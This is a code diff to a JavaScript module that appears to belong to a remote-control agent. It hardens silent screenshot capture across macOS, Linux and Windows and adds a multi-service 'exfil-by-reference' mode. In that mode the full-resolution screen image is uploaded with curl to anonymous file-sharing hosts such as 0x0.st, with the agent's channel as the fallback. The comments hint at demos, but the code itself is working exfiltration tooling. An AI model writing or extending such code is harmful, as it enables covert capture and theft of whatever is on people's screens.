@@ -129,6 +129,31 @@ function downscaleToJpeg(platform, exec, src, dest, width) {
   throw new Error(`screenshot downscaling is not supported on ${platform}`);
 }
 
+/** True when a capture tool actually wrote a non-empty image. */
+function captureSucceeded(p) {
+  try {
+    return fs.statSync(p).size > 0;
+  } catch {
+    return false;
+  }
+}
+
+function hostOf(url) {
+  try {
+    return new URL(url).host;
+  } catch {
+    return String(url);
+  }
+}
+
+/** Merge the uploadUrls list and the legacy single uploadUrl, deduped, in order. */
+export function normalizeUploadUrls(options = {}) {
+  const list = Array.isArray(options.uploadUrls) ? options.uploadUrls : [];
+  const single = String(options.uploadUrl ?? '').trim();
+  const urls = [...list.map((u) => String(u ?? '').trim()), ...(single ? [single] : [])];
+  return [...new Set(urls.filter(Boolean))];
+}
+
 /**
  * Upload a file to an anonymous, no-key file-sharing endpoint with curl
  * (`-F file=@path`, the convention used by 0x0.st, tmpfiles.org, catbox,
@@ -669,53 +694,67 @@ const TASKS = {
     try {
       if (platform === 'darwin') {
         exec('screencapture', ['-x', '-t', 'png', tmp], EXEC_OPTS);
+        if (!captureSucceeded(tmp)) {
+          throw new Error(
+            'screencapture wrote no image — grant the agent\'s terminal Screen Recording permission',
+          );
+        }
       } else if (platform === 'linux') {
+        // Tools can exit 0 without writing anything (X11 utilities on a
+        // Wayland session), so every candidate is verified against the file.
         const candidates = [
-          ['import', ['-window', 'root', tmp]], // ImageMagick
-          ['scrot', [tmp]],
-          ['gnome-screenshot', ['-f', tmp]],
+          ['import', ['-window', 'root', tmp]], // ImageMagick (X11 only)
+          ['grim', [tmp]], // wlroots-native Wayland
+          ['scrot', [tmp]], // X11 only
+          ['gnome-screenshot', ['-f', tmp]], // GNOME portal (Wayland-aware)
         ];
-        let captured = false;
+        const failures = [];
         for (const [file, toolArgs] of candidates) {
+          fs.rmSync(tmp, { force: true });
           try {
             exec(file, toolArgs, EXEC_OPTS);
-            captured = true;
-            break;
-          } catch {
-            // Try the next common X11 screenshot utility.
+            if (captureSucceeded(tmp)) break;
+            failures.push(`${file}: exited without writing an image (X11 tool on Wayland?)`);
+          } catch (err) {
+            failures.push(`${file}: ${err.message.split('\n')[0]}`);
           }
         }
-        if (!captured) {
-          throw new Error(`no screenshot tool found; tried ${candidates.map(([f]) => f).join(', ')}`);
+        if (!captureSucceeded(tmp)) {
+          throw new Error(`no screenshot tool produced an image — ${failures.join('; ')}`);
         }
       } else if (platform === 'win32') {
         exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_SCREENSHOT_SCRIPT, tmp], EXEC_OPTS);
+        if (!captureSucceeded(tmp)) {
+          throw new Error('screen capture wrote no image');
+        }
       } else {
         throw new Error(`screenshot is not supported on ${platform}`);
       }
       const max = positiveLimit(options.maxFileBytes, DEFAULT_MAX_FILE_BYTES);
-      // Exfil-via-reference mode (opt-in): upload the full-resolution PNG to
-      // an anonymous file share and return just the URL — one result tag
-      // instead of hundreds. Falls back to channel transfer on any failure.
-      const uploadUrl = String(options.uploadUrl ?? '').trim();
+      // Exfil-by-reference mode (opt-in): upload the full-resolution PNG to
+      // the first reachable anonymous file share and return just the URL —
+      // one result tag instead of hundreds. Services are tried in order;
+      // channel transfer is the final fallback.
+      const uploadUrls = normalizeUploadUrls(options);
       let uploadNote = '';
-      if (uploadUrl) {
-        try {
-          const url = uploadFileAndExtractUrl(uploadUrl, tmp, exec);
-          const st = fs.statSync(tmp);
-          return (
-            `screen captured (${st.size} bytes PNG, full resolution) -> ${url}\n` +
-            'note: anyone with this link can read the image; treat it as expired after the demo'
-          );
-        } catch (err) {
-          let host = uploadUrl;
+      if (uploadUrls.length > 0) {
+        const failures = [];
+        for (const endpoint of uploadUrls) {
           try {
-            host = new URL(uploadUrl).host;
-          } catch {
-            // Keep the raw value in the note.
+            const url = uploadFileAndExtractUrl(endpoint, tmp, exec);
+            const st = fs.statSync(tmp);
+            const via = failures.length > 0
+              ? ` via ${hostOf(endpoint)} (after ${failures.length} service failure(s))`
+              : '';
+            return (
+              `screen captured (${st.size} bytes PNG, full resolution)${via} -> ${url}\n` +
+              'note: anyone with this link can read the image; treat it as expired after the demo'
+            );
+          } catch (err) {
+            failures.push(`${hostOf(endpoint)}: ${err.message.split('\n')[0]}`);
           }
-          uploadNote = `upload to ${host} failed (${err.message.split('\n')[0]}); fell back to channel transfer — `;
         }
+        uploadNote = `all ${uploadUrls.length} upload service(s) failed (${failures.join('; ')}) — fell back to channel transfer, `;
       }
       let finalPath = tmp;
       let name = 'screenshot.png';
